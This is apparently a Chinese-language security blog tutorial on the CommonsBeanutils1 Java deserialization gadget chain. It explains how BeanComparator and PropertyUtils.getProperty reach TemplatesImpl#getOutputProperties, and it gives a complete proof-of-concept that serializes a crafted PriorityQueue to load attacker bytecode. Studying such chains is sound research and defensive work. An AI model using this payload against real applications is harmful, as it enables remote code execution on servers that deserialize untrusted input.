---
title: "Java反序列化-CB链"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# java反序列化-CB链

今天学学CB链，在CC2中我们是靠触发Comparator的compare来进行反序列化调用，还有没有类似的调用链呢

## Apache Commons Beanutils

Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法

简单来看，java bean就是一个属性私有、有getter和setter的类，风格和我们熟悉的面向对象差别不大

比如这个类D0g3er，其中getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）：

~~~java
package com.yuy0ung;

public class D0g3er {
    private String name;

    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
}
~~~

commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如这样：

~~~java
package com.yuy0ung;

import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.InvocationTargetException;

public class TestPropertyUtils {
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        D0g3er Yuy0ung = new D0g3er();
        Yuy0ung.setName("Yuy0ung");
        String name = (String) PropertyUtils.getProperty(Yuy0ung,"name");
        System.out.println(name);
    }
}
~~~

此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值：

![image-20251030173003219](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251030173003219.png)

除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, "b.c"); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用

## getter的利用

接下来我们还是尝试寻找可以利用的`java.util.Comparator`对象，很巧的是，在Commons Beanutils中就有一个现成的`org.apache.commons.beanutils.BeanComparator`，它是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了java.util.Comparator 接口

我们可以看看他的compare方法：

![QQ_1761819045139](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761819045139.png)

逻辑很清晰：这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值

我们知道PropertyUtils.getProperty可以调用任意JavaBean的getter方法，所以此处我们需要找一个能够执行恶意代码的getter，我们在分析TemplatesImpl动态加载字节码的时候，有这么一个调用链：

~~~java
TemplatesImpl#getOutputProperties()
  TemplatesImpl#newTransformer()
    TemplatesImpl#getTransletInstance()
      TemplatesImpl#defineTransletClasses()
        TransletClassLoader#defineClass()
~~~

我们注意到这里有一个能够被外部调用的方法getOutputProperties()，并且它是一个getter

回到上面的`PropertyUtils.getProperty( o1, property ) `这段代码，当o1是一个 TemplatesImpl 对象，而 property 的值为 outputProperties 时，将会自动调用getter，也就是TemplatesImpl#getOutputProperties() 方法，触发代码执行

接下来就可以着手构造了

## 构造

主要是触发点的构造，先实例化BeanComparator，然后用这个comparator实例化优先队列 PriorityQueue，恶意对象仍然通过反射去设置：

~~~java
BeanComparator bc = new BeanComparator();
PriorityQueue pq = new PriorityQueue(2, bc);
pq.add(1);
pq.add(1);

setFieldValue(bc, "property", "outputProperties");
setFieldValue(pq, "queue",new Object[]{tmpl, tmpl});
~~~

完整poc：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

import javax.xml.transform.Transformer;
import java.io.*;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils1 {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        BeanComparator bc = new BeanComparator();
        PriorityQueue pq = new PriorityQueue(2, bc);
        pq.add(1);
        pq.add(1);

        setFieldValue(bc, "property", "outputProperties");
        setFieldValue(pq, "queue",new Object[]{tmpl, tmpl});

        serialize(pq);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

运行报错了：

![QQ_1761821129092](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761821129092.png)

说是没找到 `org.apache.commons.collections.comparators.ComparableComparator`，也就是说这个CB有一部分依赖于CC，那添加CC依赖即可，再次运行成功加载字节码：

![QQ_1761821336550](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761821336550.png)

